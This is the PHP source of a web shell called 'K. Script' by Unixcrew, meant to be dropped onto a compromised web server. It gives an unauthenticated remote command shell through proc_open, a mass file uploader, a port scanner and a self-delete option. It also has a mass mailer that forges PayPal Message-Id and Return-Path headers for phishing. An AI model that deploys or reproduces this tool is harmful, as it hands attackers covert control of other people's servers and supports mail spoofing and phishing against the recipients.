   <?php
   /* <Settings> */
   $Title = "K. Script v0.3 Beta By Unixcrew: ";
   $GraphicHeader = '<meta http-equiv="Content-Type" content="text/html; charset=windows-1257">
       <style type="text/css">
           body{
               background-color: #F6F6F6;
               text-align: center;
               width: 100%;
               padding: 0px;
               margin: 0px;
           }
           #unCenter{
               width: 300px;
               margin-left: auto;
               margin-right: auto;
               text-align: left;
           }
           #unCenterShell{
                       width: 500px;
                       margin-left: auto;
                       margin-right: auto;
               text-align: left;
           }
           #unCenterShell{
                       width: 700px;
                       margin-left: auto;
                       margin-right: auto;
           }
           .Marged{
               margin-top: 20px;
           }
           .Input{
           border: 1px solid #DADADA;
           }
           .Table{
               border: 1px solid #DADADA;
               background-color: White;
               padding: 10px;
               font: 11px Tahoma, Verdana, sans-serif;
               line-height: 17px;
               color: Gray;
           }
           a{
               text-decoration: none;
               color: #003473;
           }
           a:hover{
               text-decoration: none;
               color: #F5822B;
           }
           img{
               border: 0px;
           }
           h1{
               font-size: 14px;
               font-weight: bold;
               padding: 0px;
               margin-bottom: 7px;
           }

           .Black{
               color: Gray;
               font: 11px Tahoma, Verdana, sans-serif;
           }
           .BlackRealy{
               color: Black;
               font: 12px Tahoma, Verdana, sans-serif;
           }
       </style>';

       $SiteHeader = '</head><body><br>
       <a href="?MainPage"><img src="http://kileris.net/images/fuck.gif" width="50" height="50" alt="Home"></a><hr width="90%">';

       $GraphicFooter = '<hr width="90%">
       <div align="center" class="black">[<a href="?Uploader">FileUploader</a>]<span class="BlackRealy">  |  </span>[<a href="?PHPShell">PHPShell</a>]<span class="BlackRealy">  |  </span>[<a href="?PortCheck">PortCheck</a><span class="BlackRealy">  |  </span>[<a href="?Mailer">MassMailer</a>]<span class="BlackRealy">  |  </span>[<a href="?DeleteMe">Delete Me</a>]</div>
   <div><img width="1" height="1" ></div>
       <div align="center" class="Black">Copyright &copy; 2005 <a href="mailto:Gadamnit@gmail.com">Unixcrew</a></div>
   </body></html>';
   /* </Settings> */

   if ($_SERVER['QUERY_STRING'] == '') {
   header("Location: http://" . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'] . "?MainPage");
   }

   if(isset($_GET['PHPShell'])) {
   /* <ShellScript> */
   $passwd = array();
   $aliases = array();

   session_start();
   if (empty($_SESSION['cwd']) || !empty($_REQUEST['reset'])) {
       $_SESSION['cwd'] = getcwd();
       $_SESSION['history'] = array();
       $_SESSION['output'] = '';
     }

     if (!empty($_REQUEST['command'])) {
       if (get_magic_quotes_gpc()) {
         $_REQUEST['command'] = stripslashes($_REQUEST['command']);
       }

      if (($i = array_search($_REQUEST['command'], $_SESSION['history'])) !== false)
         unset($_SESSION['history'][$i]);

       array_unshift($_SESSION['history'], $_REQUEST['command']);

       $_SESSION['output'] .= '$ ' . $_REQUEST['command'] . "\n";

       /* Initialize the current working directory. */
       if (ereg('^[[:blank:]]*cd[[:blank:]]*$', $_REQUEST['command'])) {
         $_SESSION['cwd'] = dirname(__FILE__);
       } elseif (ereg('^[[:blank:]]*cd[[:blank:]]+([^;]+)$', $_REQUEST['command'], $regs)) {
         /* The current command is a 'cd' command which we have to handle
          * as an internal shell command. */

         if ($regs[1][0] == '/') {
           /* Absolute path, we use it unchanged. */
           $new_dir = $regs[1];
         } else {
           /* Relative path, we append it to the current working
            * directory. */
           $new_dir = $_SESSION['cwd'] . '/' . $regs[1];
         }

         /* Transform '/./' into '/' */
         while (strpos($new_dir, '/./') !== false)
           $new_dir = str_replace('/./', '/', $new_dir);

         /* Transform '//' into '/' */
         while (strpos($new_dir, '//') !== false)
           $new_dir = str_replace('//', '/', $new_dir);

         /* Transform 'x/..' into '' */
         while (preg_match('|/\.\.(?!\.)|', $new_dir))
           $new_dir = preg_replace('|/?[^/]+/\.\.(?!\.)|', '', $new_dir);

         if ($new_dir == '') $new_dir = '/';

         /* Try to change directory. */
         if (@chdir($new_dir)) {
           $_SESSION['cwd'] = $new_dir;
         } else {
           $_SESSION['output'] .= "cd: could not change to: $new_dir\n";
         }

       } else {
         /* The command is not a 'cd' command, so we execute it after
          * changing the directory and save the output. */
         chdir($_SESSION['cwd']);

         /* Alias expansion. */
         $length = strcspn($_REQUEST['command'], " \t");
         $token = substr($_REQUEST['command'], 0, $length);
         if (isset($aliases[$token]))
           $_REQUEST['command'] = $aliases[$token] . substr($_REQUEST['command'], $length);

         $p = proc_open($_REQUEST['command'],
                        array(1 => array('pipe', 'w'),
                              2 => array('pipe', 'w')),
                        $io);

         /* Read output sent to stdout. */
         while (!feof($io[1])) {
           $_SESSION['output'] .= htmlspecialchars(fgets($io[1]),
                                                   ENT_COMPAT, 'UTF-8');
         }
         /* Read output sent to stderr. */
         while (!feof($io[2])) {
           $_SESSION['output'] .= htmlspecialchars(fgets($io[2]),
                                                   ENT_COMPAT, 'UTF-8');
         }

         fclose($io[1]);
         fclose($io[2]);
         proc_close($p);
       }
     }

     /* Build the command history for use in the JavaScript */
     if (empty($_SESSION['history'])) {
       $js_command_hist = '""';
     } else {
       $escaped = array_map('addslashes', $_SESSION['history']);
       $js_command_hist = '"", "' . implode('", "', $escaped) . '"';
     }


   echo '<xml version="1.0" encoding="UTF-8">';
   echo '<html><head><title>'.$Title.' PHPShell</title>';
   echo $GraphicHeader;
   ?>
   <!-- </ShellScript> -->


   <!-- <ShellGraphic> -->


   <script type="text/javascript" language="JavaScript">
     var current_line = 0;
     var command_hist = new Array(<?php echo $js_command_hist ?>);
     var last = 0;

     function key(e) {
       if (!e) var e = window.event;

       if (e.keyCode == 38 && current_line < command_hist.length-1) {
         command_hist[current_line] = document.shell.command.value;
         current_line++;
         document.shell.command.value = command_hist[current_line];
       }

       if (e.keyCode == 40 && current_line > 0) {
         command_hist[current_line] = document.shell.command.value;
         current_line--;
         document.shell.command.value = command_hist[current_line];
       }

     }

   function init() {
     document.shell.setAttribute("autocomplete", "off");
     document.shell.output.scrollTop = document.shell.output.scrollHeight;
     document.shell.command.focus();
   }

     </script>
   <? echo $SiteHeader; ?>

   <body onload="init()">
   <?php
   error_reporting (E_ALL);
   if (empty($_REQUEST['rows'])) $_REQUEST['rows'] = 10;
   ?>
   <div id="unCenterShell">
       <div class="Marged">
           <div class="Table">
               <center>
               <div>Current Directory: <?php echo $_SESSION['cwd'] ?></div>
               </center>
           </div>
       </div>
   </div>

   <div id="unCenterShell">
       <div class="Marged">
           <div class="Table">
               <center>
               <div><form name="shell" action="<?php echo $_SERVER['PHP_SELF'] ..'?PHPShell'?>" method="post"></div>
               <div>
       <textarea class="Input" name="output" readonly="readonly" cols="55" rows="<?php echo $_REQUEST['rows'] ?>">
       <?php
       $lines = substr_count($_SESSION['output'], "\n");
       $padding = str_repeat("\n", max(0, $_REQUEST['rows']+1 - $lines));
       echo rtrim($padding . $_SESSION['output']);
       ?>
       </textarea>
               </div>
       <div>$&nbsp;&nbsp;<input class="Input" name="command" type="text" onkeyup="key(event)" size="72" tabindex="1"><div>
               </center>
           </div>
       </div>
   </div>


   <div id="unCenter">
       <div class="Marged">
           <div class="Table">
               <center>
               <div><input type="submit" value="Execute Command" />&nbsp;<input type="submit" name="reset" value="Reset" /></div>
               <div>Rows: <input type="text" name="rows" value="<?php echo $_REQUEST['rows'] ?>" /></div>
           </form>
               </center>
           </div>
       </div>
   </div>
   <!-- </ShellGraphic> -->
   <? echo $GraphicFooter; } ?>


   <? if(isset($_GET['Uploader'])){
   echo '<html><head><title>'.$Title.' Uploader</title>';
   echo $GraphicHeader; echo $SiteHeader;  ?>
   <!-- <MassUploaderScript> -->
   <?php
   if(isset($_POST['upl_files'])){
     echo '<div id="unCenter"><div class="Marged"><div class="Table">
           <div>Uploaded Files:<br></div>';
     //print_r($_FILES['file_n']);
     $up_mas = $_FILES['file_n'];
     $mas_name = array();
     $mas_tmp = array();
     for($i=0; $i<10; $i++){
       if(!empty($up_mas['name'][$i])){
         $j = count($mas_name);
         $mas_name[$j] = $up_mas['name'][$i];
         $mas_tmp[$j] = $up_mas['tmp_name'][$i];
         }
       }
     for($i=0; $i<count($mas_name); $i++){
       $upl_file = './'.$mas_name[$i];
       if(move_uploaded_file($mas_tmp[$i], $upl_file)){
         echo '<a href="'.$mas_name[$i].'">'.$mas_name[$i].'</a>,&nbsp';
         }
       }
     }
   echo "</div></div></div>";
   ?>
   <!-- </MassUploaderScript> -->

   <!-- <MassUploaderGraphic> -->
   <div id="unCenter">
       <div class="Marged">
           <div class="Table">
               <center>
               <br>
               <form enctype="multipart/form-data" method="post" action="">
               <div>
               <?php
            for($i=0; $i<10; $i++){
             echo '<div><input class="Input" type="file" name="file_n[]"></div>';
             } ?>
             </div>
             <div><input type="reset" name="reset" value="Reset">&nbsp;<input type="submit" name="upl_files" value="upload"></div>
               </center>
           </div>
       </div>
   </div>
   <!-- </MassUploaderGraphic> -->
   <? echo $GraphicFooter; } ?>


   <? if(isset($_GET['MainPage'])){
   echo '<html><head><title>'.$Title.'</title>';
   echo $GraphicHeader; echo $SiteHeader; ?>
   <!-- <MainPageGraphic> -->
   <div id="unCenter">
       <div class="Marged">
           <div class="Table">
               <center>
               <div></div>
               <div><a href="?Uploader">FileUploader</a></div>
               <div><a href="?PHPShell">PHPShell</a></div>
               <div><a href="?PortCheck">PortCheck</a></div>
               <div><a href="?Mailer">MassMailer</a></div>
               <div><hr width="200"></div>
               <div><a href="?DeleteMe">Delete me</a></div>
               </center>
           </div>
       </div>
   </div>
   <!-- <MainPageGraphic> -->
   <? echo $GraphicFooter; } ?>

   <!-- <PortCheck> -->
   <? if(isset($_GET['PortCheck'])) {
   echo '<html><head><title>'.$Title.' PortCheck</title>';
   echo $GraphicHeader; echo $SiteHeader;

   $ip = getenv ("REMOTE_ADDR");
   $client_ip = getenv ("HTTP_CLIENT_IP");
   $forward = getenv ("HTTP_X_FORWARDED_FOR");
   $via = getenv ("HTTP_VIA");

   if (($ip == $client_ip) || ($client_ip == NULL)) {
       $host = $ip;
   } else if (($via) || ($forward)) {
       $host = $client_ip;
   }

   if( $_GET['port'] == "") {
   $ports="20 21 22 23 25 37 53 67 79 80 110 137 138 139 143 443 993 995 2082 1080 8080 8181";
   } else {
   $ports=$_GET['port'];
   }

   $arr[1] = "tcpmux (TCP Port Service Multiplexer)";
   $arr[2] = "Management Utility";
   $arr[3] = "Compression Process";
   $arr[5] = "rje (Remote Job Entry)";
   $arr[7] = "echo";
   $arr[9] = "discard";
   $arr[11] = "systat";
   $arr[13] = "daytime";
   $arr[15] = "netstat";
   $arr[17] = "quote of the day";
   $arr[18] = "send/rwp";
   $arr[19] = "character generator";
   $arr[20] = "ftp-data";
   $arr[21] = "ftp";
   $arr[22] = "ssh, pcAnywhere";
   $arr[23] = "Telnet";
   $arr[25] = "SMTP (Simple Mail Transfer)";
   $arr[27] = "ETRN (NSW User System FE)";
   $arr[29] = "MSG ICP";
   $arr[31] = "MSG Authentication";
   $arr[33] = "dsp (Display Support Protocol)";
   $arr[37] = "time";
   $arr[38] = "RAP (Route Access Protocol)";
   $arr[39] = "rlp (Resource Location Protocol)";
   $arr[41] = "Graphics";
   $arr[42] = "nameserv, WINS";
   $arr[43] = "whois, nickname";
   $arr[44] = "MPM FLAGS Protocol";
   $arr[45] = "Message Processing Module [recv]";
   $arr[46] = "MPM [default send]";
   $arr[47] = "NI FTP";
   $arr[48] = "Digital Audit Daemon";
   $arr[49] = "TACACS, Login Host Protocol";
   $arr[50] = "RMCP, re-mail-ck";
   $arr[53] = "DNS";
   $arr[57] = "MTP (any private terminal access)";
   $arr[59] = "NFILE";
   $arr[60] = "Unassigned";
   $arr[61] = "NI MAIL";
   $arr[62] = "ACA Services";
   $arr[63] = "whois++";
   $arr[64] = "Communications Integrator (CI)";
   $arr[65] = "TACACS-Database Service";
   $arr[66] = "Oracle SQL*NET";
   $arr[67] = "bootps (Bootstrap Protocol Server)";
   $arr[68] = "bootpd/dhcp (Bootstrap Protocol Client)";
   $arr[69] = "Trivial File Transfer Protocol (tftp)";
   $arr[70] = "Gopher";
   $arr[71] = "Remote Job Service";
   $arr[72] = "Remote Job Service";
   $arr[73] = "Remote Job Service";
   $arr[74] = "Remote Job Service";
   $arr[75] = "any private dial out service";
   $arr[76] = "Distributed External Object Store";
   $arr[77] = "any private RJE service";
   $arr[78] = "vettcp";
   $arr[79] = "finger";
   $arr[80] = "World Wide Web HTTP";
   $arr[81] = "HOSTS2 Name Serve";
   $arr[82] = "XFER Utility";
   $arr[83] = "MIT ML Device";
   $arr[84] = "Common Trace Facility";
   $arr[85] = "MIT ML Device";
   $arr[86] = "Micro Focus Cobol";
   $arr[87] = "any private terminal link";
   $arr[88] = "Kerberos, WWW";
   $arr[89] = "SU/MIT Telnet Gateway";
   $arr[90] = "DNSIX Securit Attribute Token Map";
   $arr[91] = "MIT Dover Spooler";
   $arr[92] = "Network Printing Protocol";
   $arr[93] = "Device Control Protocol";
   $arr[94] = "Tivoli Object Dispatcher";
   $arr[95] = "supdup";
   $arr[96] = "DIXIE";
   $arr[98] = "linuxconf";
   $arr[99] = "Metagram Relay";
   $arr[100] = "[unauthorized use]";
   $arr[101] = "HOSTNAME";
   $arr[102] = "ISO, X.400, ITOT";
   $arr[103] = "Genesis Point-to&#14144;&#429;oi&#65535;&#65535; T&#0;&#0;ns&#0;&#0;et";
   $arr[104] = "ACR-NEMA Digital Imag. & Comm. 300";
   $arr[105] = "CCSO name server protocol";
   $arr[106] = "poppassd";
   $arr[107] = "Remote Telnet Service";
   $arr[108] = "SNA Gateway Access Server";
   $arr[109] = "POP2";
   $arr[110] = "POP3";
   $arr[111] = "Sun RPC Portmapper";
   $arr[112] = "McIDAS Data Transmission Protocol";
   $arr[113] = "Authentication Service";
   $arr[115] = "sftp (Simple File Transfer Protocol)";
   $arr[116] = "ANSA REX Notify";
   $arr[117] = "UUCP Path Service";
   $arr[118] = "SQL Services";
   $arr[119] = "NNTP";
   $arr[120] = "CFDP";
   $arr[123] = "NTP";
   $arr[124] = "SecureID";
   $arr[129] = "PWDGEN";
   $arr[133] = "statsrv";
   $arr[135] = "loc-srv/epmap";
   $arr[137] = "netbios-ns";
   $arr[138] = "netbios-dgm (UDP)";
   $arr[139] = "NetBIOS";
   $arr[143] = "IMAP";
   $arr[144] = "NewS";
   $arr[150] = "SQL-NET";
   $arr[152] = "BFTP";
   $arr[153] = "SGMP";
   $arr[156] = "SQL Service";
   $arr[161] = "SNMP";
   $arr[175] = "vmnet";
   $arr[177] = "XDMCP";
   $arr[178] = "NextStep Window Server";
   $arr[179] = "BGP";
   $arr[180] = "SLmail admin";
   $arr[199] = "smux";
   $arr[210] = "Z39.50";
   $arr[213] = "IPX";
   $arr[218] = "MPP";
   $arr[220] = "IMAP3";
   $arr[256] = "RAP";
   $arr[257] = "Secure Electronic Transaction";
   $arr[258] = "Yak Winsock Personal Chat";
   $arr[259] = "ESRO";
   $arr[264] = "FW1_topo";
   $arr[311] = "Apple WebAdmin";
   $arr[350] = "MATIP type A";
   $arr[351] = "MATIP type B";
   $arr[363] = "RSVP tunnel";
   $arr[366] = "ODMR (On-Demand Mail Relay)";
   $arr[371] = "Clearcase";
   $arr[387] = "AURP (AppleTalk Update-Based Routing Protocol)";
   $arr[389] = "LDAP";
   $arr[407] = "Timbuktu";
   $arr[427] = "Server Location";
   $arr[434] = "Mobile IP";
   $arr[443] = "ssl";
   $arr[444] = "snpp, Simple Network Paging Protocol";
   $arr[445] = "SMB";
   $arr[458] = "QuickTime TV/Conferencing";
   $arr[468] = "Photuris";
   $arr[475] = "tcpnethaspsrv";
   $arr[500] = "ISAKMP, pluto";
   $arr[511] = "mynet-as";
   $arr[512] = "biff, rexec";
   $arr[513] = "who, rlogin";
   $arr[514] = "syslog, rsh";
   $arr[515] = "lp, lpr, line printer";
   $arr[517] = "talk";
   $arr[520] = "RIP (Routing Information Protocol)";
   $arr[521] = "RIPng";
   $arr[522] = "ULS";
   $arr[531] = "IRC";
   $arr[543] = "KLogin, AppleShare over IP";
   $arr[545] = "QuickTime";
   $arr[548] = "AFP";
   $arr[554] = "Real Time Streaming Protocol";
   $arr[555] = "phAse Zero";
   $arr[563] = "NNTP over SSL";
   $arr[575] = "VEMMI";
   $arr[581] = "Bundle Discovery Protocol";
   $arr[593] = "MS-RPC";
   $arr[608] = "SIFT/UFT";
   $arr[626] = "Apple ASIA";
   $arr[631] = "IPP (Internet Printing Protocol)";
   $arr[635] = "RLZ DBase";
   $arr[636] = "sldap";
   $arr[642] = "EMSD";
   $arr[648] = "RRP (NSI Registry Registrar Protocol)";
   $arr[655] = "tinc";
   $arr[660] = "Apple MacOS Server Admin";
   $arr[666] = "Doom";
   $arr[674] = "ACAP";
   $arr[687] = "AppleShare IP Registry";
   $arr[700] = "buddyphone";
   $arr[705] = "AgentX for SNMP";
   $arr[901] = "swat, realsecure";
   $arr[993] = "s-imap";
   $arr[995] = "s-pop";
   $arr[1024] = "Reserved";
   $arr[1025] = "network blackjack";
   $arr[1062] = "Veracity";
   $arr[1080] = "SOCKS";
   $arr[1085] = "WebObjects";
   $arr[1227] = "DNS2Go";
   $arr[1243] = "SubSeven";
   $arr[1338] = "Millennium Worm";
   $arr[1352] = "Lotus Notes";
   $arr[1381] = "Apple Network License Manager";
   $arr[1417] = "Timbuktu Service 1 Port";
   $arr[1418] = "Timbuktu Service 2 Port";
   $arr[1419] = "Timbuktu Service 3 Port";
   $arr[1420] = "Timbuktu Service 4 Port";
   $arr[1433] = "Microsoft SQL Server";
   $arr[1434] = "Microsoft SQL Monitor";
   $arr[1477] = "ms-sna-server";
   $arr[1478] = "ms-sna-base";
   $arr[1490] = "insitu-conf";
   $arr[1494] = "Citrix ICA Protocol";
   $arr[1498] = "Watcom-SQL";
   $arr[1500] = "VLSI License Manager";
   $arr[1503] = "T.120";
   $arr[1521] = "Oracle SQL";
   $arr[1522] = "Ricardo North America License Manager";
   $arr[1524] = "ingres";
   $arr[1525] = "prospero";
   $arr[1526] = "prospero";
   $arr[1527] = "tlisrv";
   $arr[1529] = "oracle";
   $arr[1547] = "laplink";
   $arr[1604] = "Citrix ICA, MS Terminal Server";
   $arr[1645] = "RADIUS Authentication";
   $arr[1646] = "RADIUS Accounting";
   $arr[1680] = "Carbon Copy";
   $arr[1701] = "L2TP/LSF";
   $arr[1717] = "Convoy";
   $arr[1720] = "H.323/Q.931";
   $arr[1723] = "PPTP control port";
   $arr[1731] = "MSICCP";
   $arr[1755] = "Windows Media .asf";
   $arr[1758] = "TFTP multicast";
   $arr[1761] = "cft-0";
   $arr[1762] = "cft-1";
   $arr[1763] = "cft-2";
   $arr[1764] = "cft-3";
   $arr[1765] = "cft-4";
   $arr[1766] = "cft-5";
   $arr[1767] = "cft-6";
   $arr[1808] = "Oracle-VP2";
   $arr[1812] = "RADIUS server";
   $arr[1813] = "RADIUS accounting";
   $arr[1818] = "ETFTP";
   $arr[1973] = "DLSw DCAP/DRAP";
   $arr[1985] = "HSRP";
   $arr[1999] = "Cisco AUTH";
   $arr[2001] = "glimpse";
   $arr[2049] = "NFS";
   $arr[2064] = "distributed.net";
   $arr[2065] = "DLSw";
   $arr[2066] = "DLSw";
   $arr[2106] = "MZAP";
   $arr[2140] = "DeepThroat";
   $arr[2301] = "Compaq Insight Management Web Agents";
   $arr[2327] = "Netscape Conference";
   $arr[2336] = "Apple UG Control";
   $arr[2427] = "MGCP gateway";
   $arr[2504] = "WLBS";
   $arr[2535] = "MADCAP";
   $arr[2543] = "sip";
   $arr[2592] = "netrek";
   $arr[2727] = "MGCP call agent";
   $arr[2628] = "DICT";
   $arr[2998] = "ISS Real Secure Console Service Port";
   $arr[3000] = "Firstclass";
   $arr[3001] = "Redwood Broker";
   $arr[3031] = "Apple AgentVU";
   $arr[3128] = "squid";
   $arr[3130] = "ICP";
   $arr[3150] = "DeepThroat";
   $arr[3264] = "ccmail";
   $arr[3283] = "Apple NetAssitant";
   $arr[3288] = "COPS";
   $arr[3305] = "ODETTE";
   $arr[3306] = "mySQL";
   $arr[3389] = "RDP Protocol (Terminal Server)";
   $arr[3521] = "netrek";
   $arr[4000] = "icq, command-n-conquer";
   $arr[4321] = "rwhois";
   $arr[4333] = "mSQL";
   $arr[4444] = "KRB524";
   $arr[4827] = "HTCP";
   $arr[5002] = "radio free ethernet";
   $arr[5004] = "RTP";
   $arr[5005] = "RTP";
   $arr[5010] = "Yahoo! Messenger";
   $arr[5050] = "multimedia conference control tool";
   $arr[5060] = "SIP";
   $arr[5150] = "Ascend Tunnel Management Protocol";
   $arr[5190] = "AIM";
   $arr[5500] = "securid";
   $arr[5501] = "securidprop";
   $arr[5423] = "Apple VirtualUser";
   $arr[5555] = "Personal Agent";
   $arr[5631] = "PCAnywhere data";
   $arr[5632] = "PCAnywhere";
   $arr[5678] = "Remote Replication Agent Connection";
   $arr[5800] = "VNC";
   $arr[5801] = "VNC";
   $arr[5900] = "VNC";
   $arr[5901] = "VNC";
   $arr[6000] = "X Windows";
   $arr[6112] = "BattleNet";
   $arr[6502] = "Netscape Conference";
   $arr[6667] = "IRC";
   $arr[6670] = "VocalTec Internet Phone, DeepThroat";
   $arr[6699] = "napster";
   $arr[6776] = "Sub7";
   $arr[6970] = "RTP";
   $arr[7007] = "MSBD, Windows Media encoder";
   $arr[7070] = "RealServer/QuickTime";
   $arr[7777] = "cbt";
   $arr[7778] = "Unreal";
   $arr[7648] = "CU-SeeMe";
   $arr[7649] = "CU-SeeMe";
   $arr[8000] = "iRDMI/Shoutcast Server";
   $arr[8010] = "WinGate 2.1";
   $arr[8080] = "HTTP";
   $arr[8181] = "HTTP";
   $arr[8383] = "IMail WWW";
   $arr[8875] = "napster";
   $arr[8888] = "napster";
   $arr[8889] = "Desktop Data TCP 1";
   $arr[8890] = "Desktop Data TCP 2";
   $arr[8891] = "Desktop Data TCP 3: NESS application";
   $arr[8892] = "Desktop Data TCP 4: FARM product";
   $arr[8893] = "Desktop Data TCP 5: NewsEDGE/Web application";
   $arr[8894] = "Desktop Data TCP 6: COAL application";
   $arr[9000] = "CSlistener";
   $arr[10008] = "cheese worm";
   $arr[11371] = "PGP 5 Keyserver";
   $arr[13223] = "PowWow";
   $arr[13224] = "PowWow";
   $arr[14237] = "Palm";
   $arr[14238] = "Palm";
   $arr[18888] = "LiquidAudio";
   $arr[21157] = "Activision";
   $arr[22555] = "Vocaltec Web Conference";
   $arr[23213] = "PowWow";
   $arr[23214] = "PowWow";
   $arr[23456] = "EvilFTP";
   $arr[26000] = "Quake";
   $arr[27001] = "QuakeWorld";
   $arr[27010] = "Half-Life";
   $arr[27015] = "Half-Life";
   $arr[27960] = "QuakeIII";
   $arr[30029] = "AOL Admin";
   $arr[31337] = "Back Orifice";
   $arr[32777] = "rpc.walld";
   $arr[45000] = "Cisco NetRanger postofficed";
   $arr[32773] = "rpc bserverd";
   $arr[32776] = "rpc.spray";
   $arr[32779] = "rpc.cmsd";
   $arr[38036] = "timestep";
   $arr[40193] = "Novell";
   $arr[41524] = "arcserve discovery";
   $arr[2082] = "cPanel";

   if($arr[$port]==""){
   $arr[$port] = "Unknown Port";
   }

   print "<div id=\"unCenter\"><div class=\"Marged\"><div class=\"Table\" style=\"padding-left: 20\">";

   $portcont=0;
   foreach(explode(" ","$ports") as $port) {
        $portcont++;
        if ($portcont < 30 ) {
        if ( is_numeric($port) ) {
        $fp = @fsockopen($host,$port,$errno,$errstr,3);
        if(!$fp)
        {
            print "<div>$port | <span style=\"color: RED;\">CLOSE</span> |";
        }
        else
        {
            print "<div>$port | <span style=\"color: GREEN;\">OPEN</span>  |";
            fclose($fp);
       }
       print " $arr[$port]</div>";
       flush();
       }else{
          print "Error a $port. Not valid.";
       }
     }
   }
   print "</div></div></div>";
   ?>

   </table>
   <div id="unCenter">
       <div class="Marged">
           <div class="Table">
               <center>
               <div>Other Port (enter for check):<br></div>
               <div><form action="<? echo $_SERVER['PHP_SELF'] . '?PortCheck&port' ?>" method="GET"></div>
               <div><input type="text" name="port">&nbsp;<input type="submit" value="Scan"></div>
               </center>
           </div>
       </div>
   </div>
   <!-- </PortCheck> -->
   <? echo $GraphicFooter; } ?>

   <? if(isset($_GET['Mailer'])) {
   echo '<html><head><title>'.$Title.' Mailer</title>';
   echo $GraphicHeader;
   echo $SiteHeader;

   if ($action=="send"){
       $message = urlencode($message);
       $message = ereg_replace("%5C%22", "%22", $message);
       $message = urldecode($message);
       $message = stripslashes($message);
       $subject = stripslashes($subject);
   }
   ?>
   <!-- Mailer -->
   <form name="Mailer" method="post" action="<? echo $_SERVER['PHP_SELF'] . '?Mailer' ?>" enctype="multipart/form-data">

   <div id="unCenterShell">
       <div class="Marged">
           <div class="Table">
    <div align="left">
       <div style="padding-left: 20px;">Your Email: <input class="input" type="text" name="from" value="" size="20">
       <span style="padding-left: 122px;"></span>Your Name: <input class="input" type="text" name="realname" value="" size="20"></div>
       <div style="padding-left: 26px;">Reply-To: <input class="input" type="text" name="replyto" value="" size="20">
       <span style="padding-left: 123px;"></span>Attach File: <input class="input" type="file" name="file" size="20"></div>
       <div style="padding-left: 33px;">Subject: <input class="input" type="text" name="subject" value="" size="90"></div>
    </div>
       <div align="left"><span style="padding-left: 4px;"></span>Letter:<span style="padding-left: 392px;"></span>Recipients:</div>
       <div><textarea class="input" name="message" cols="50" rows="10"></textarea>
       <textarea class="input" name="emaillist" cols="25" rows="10"></textarea></div>
           </div>
       </div>
   </div>

   <div id="unCenter">
       <div class="Marged">
           <div class="Table">
   <div align="center"><input type="radio" name="contenttype" value="plain">Plain
       <input type="radio" name="contenttype" value="html" checked>HTML
       <input type="hidden" name="action" value="send"><input class="input" type="submit" value="Send eMails"></div>
           </div>
       </div>
   </div>
   </form>
   <?
   if ($action=="send"){

       if (!$from && !$subject && !$message && !$emaillist){
       echo '<div id="unCenter"><div class="Marged"><div class="Table"><center>
       <div>Please complete all fields before sending your message.</div>
       </center></div></div></div>';
       echo $GraphicFooter;
       exit;
       }

       $allemails = split("\n", $emaillist);
       $numemails = count($allemails);

       #Open the file attachment if any, and base64_encode it for email transport
       If ($file_name){
           @copy($file, "./$file_name") or die("The file you are trying to upload couldn't be copied to the server");
           $content = fread(fopen($file,"r"),filesize($file));
           $content = chunk_split(base64_encode($content));
           $uid = strtoupper(md5(uniqid(time())));
           $name = basename($file);
       }
       echo '<div id="unCenter"><div class="Marged"><div class="Table"><center>';

       for($x=0; $x<$numemails; $x++){
           $to = $allemails[$x];
           if ($to){
           $to = ereg_replace(" ", "", $to);
           $message = ereg_replace("&email&", $to, $message);
           $subject = ereg_replace("&email&", $to, $subject);
           print "Sending: [ $to ] ";
           flush();
           $header = "From: $realname <$from>\r\n";
           $header .= "Reply-To: $replyto\r\n";
           $header .= "MIME-Version: 1.0\r\n";
           If ($file_name) $header .= "Content-Type: multipart/mixed; boundary=$uid\r\n";
           If ($file_name) $header .= "--$uid\r\n";
           $header .= "Message-Id:<1130384585.13653@paypal.com>\r\n";
           $header .= "Return-Path: <service@paypal.com>\r\n";
           $header .= "Content-Type: text/$contenttype\r\n";
           $header .= "Content-Transfer-Encoding: 8bit\r\n\r\n";
           $header .= "$message\r\n";
           If ($file_name) $header .= "--$uid\r\n";
           If ($file_name) $header .= "Content-Type: $file_type; name=\"$file_name\"\r\n";
           If ($file_name) $header .= "Content-Transfer-Encoding: base64\r\n";
           If ($file_name) $header .= "Content-Disposition: attachment; filename=\"$file_name\"\r\n\r\n";
           If ($file_name) $header .= "$content\r\n";
           If ($file_name) $header .= "--$uid--";
           mail($to, $subject, "", $header);
           print "........Success!<br>";
           flush();
           }
       }
   echo "</center></div></div></div>";
   }
   ?>
   <!-- </Mailer> -->
   <? echo $GraphicFooter; } ?>

   <? if(isset($_GET['DeleteMe'])){
   echo '<html><head><title>'.$Title.' DeleteMe</title>';
   echo $GraphicHeader; echo $SiteHeader;
   if($del){
   $url = "http://" .$_SERVER['HTTP_HOST']. "/";
   print "<META HTTP-EQUIV=\"Refresh\" CONTENT=\"0; URL= $url \">";
   unlink('kscr.php');
   }
   ?>
   <!-- <DeleteMeGraphic> -->
   <div id="unCenter">
       <div class="Marged">
           <div class="Table">
               <center>
               <div></div>
               <div style="font-size 10px: bold; font-weight: bold;">Delete Me?</div>
               <br>
               <div><a href="?DeleteMe&del=TRUE">Yes (Delete)</a><img src="" border="0" height="0" width="50"><a href="?MainPage">No (Go Home)</a></div>
               </center>
           </div>
       </div>
   </div>
   <!-- </DeleteMeGaphic> -->
   <? echo $GraphicFooter; } ?>
